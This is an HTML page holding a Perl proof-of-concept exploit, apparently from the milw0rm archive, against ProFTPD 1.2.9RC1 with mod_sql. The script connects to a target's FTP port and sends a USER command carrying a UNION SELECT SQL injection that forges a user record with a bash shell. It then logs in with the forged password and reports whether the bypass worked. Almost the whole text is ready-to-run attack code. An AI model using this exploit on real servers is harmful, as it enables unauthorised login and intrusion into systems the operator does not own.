<html><head><title>ProFTPD 1.2.9RC1 (mod_sql) Remote SQL Injection Exploit
</title></head><pre>#!/usr/bin/perl
# ProFTPD 1.2.9 rc1 mod_sql SQL Injection remote Exploit
# Spaine - 2003

use IO::Socket;
if(@ARGC&lt;2){
    print &quot;\nProof Of Concept Sql Inject on ProFTPD\n&quot;;
    print &quot;Usage: perl poc-sqlftp &lt;target&gt; [1=Alternate query]\n\n&quot;;
    exit(0);
};

$server = $ARGV[0];
$query = $ARGV[1];
$remote = 
IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;$server,PeerPort=&gt;&quot;21&quot;,Reuse=&gt;1) 
                          or die &quot;Can't connect. \n&quot;;
if(defined($line=&lt;$remote&gt;)){
    print STDOUT $line;
}

# Proof of concept query, it may change on the number of rows
# By default, it can query User, Pass, Uid, Gid, Shell or
# User, Pass, Uid, Gid, Shell, Path, change the union query...

if($query eq &quot;1&quot;){
    print $remote &quot;USER ')UNION 
SELECT'u','p',1002,1002,'/tmp','/bin/bash'WHERE(''='\n&quot;;
}else{
    print $remote &quot;USER ')UNION SELECT'u','p',1002,1002,'/bin/bash' 
WHERE(''='\n&quot;;
};
if(defined($line=&lt;$remote&gt;)){
    print STDOUT $line;
}
print $remote &quot;PASS p\n&quot;;
if(defined($line=&lt;$remote&gt;)){
    print STDOUT $line;
}
print &quot;Sent query to $ARGV[0]\n&quot;;
if($line =~ /230/){  #logged in
    print &quot;[------- Sql Inject Able \n&quot;;
}else{
    print &quot;[------- Sql Inject Unable \n&quot;;
}
close $remote;

# milw0rm.com [2003-06-19]</pre></html>